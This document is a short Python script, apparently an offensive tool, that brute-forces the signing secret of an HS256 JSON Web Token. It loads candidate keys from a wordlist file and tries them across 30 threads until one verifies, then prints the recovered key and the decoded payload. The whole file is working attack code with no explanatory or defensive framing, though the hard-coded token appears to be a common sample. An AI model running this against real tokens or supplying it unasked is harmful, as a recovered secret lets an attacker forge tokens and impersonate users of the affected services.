import time
import jwt
import threading

# Global variable to signal the threads to stop
key_found = False

# Function to check if the key is correct
def check_key(key, jwt_string):
    global key_found
    try:
        # If the decoded JWT token matches the payload, then it is the correct key
        decoded_payload = jwt.decode(jwt_string, key, algorithms='HS256')
        print(f'Key Found: {key}')
        print(f'Decoded Payload: {decoded_payload}')
        key_found = True  # Set the global variable to signal other threads to stop
    except jwt.exceptions.InvalidTokenError:
        pass

# Function to run threads for key bruteforcing
def run_bruteforce(keys, jwt_string):
    global key_found
    for key in keys:
        if key_found:
            break  # If a correct key is found, stop the loop
        check_key(key.strip(), jwt_string)

# The JWT token that we want to decode
jwt_string = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SP0R2USEDHqPV7mcIK08ZAs4WtPMQ0NdMHuSD8tnWOw'

# Read keys from the text file
with open('jwtlist.txt', 'r') as file:
    keys = file.readlines()

# Set the number of threads you want to run
num_threads = 30

# Divide the keys into num_threads parts
keys_per_thread = len(keys) // num_threads

threads = []

# Start threads with the appropriate range for each thread
for i in range(num_threads):
    start = i * keys_per_thread
    if i == num_threads - 1:
        end = len(keys)
    else:
        end = (i + 1) * keys_per_thread

    t = threading.Thread(target=run_bruteforce, args=(keys[start:end], jwt_string))
    threads.append(t)
    t.start()

# Wait for all threads to finish or for a correct key to be found
for t in threads:
    t.join()

# If a correct key is found, print a message
if key_found:
    print("Program terminated. Correct key found.")
else:
    print("Program terminated. No correct key found.")
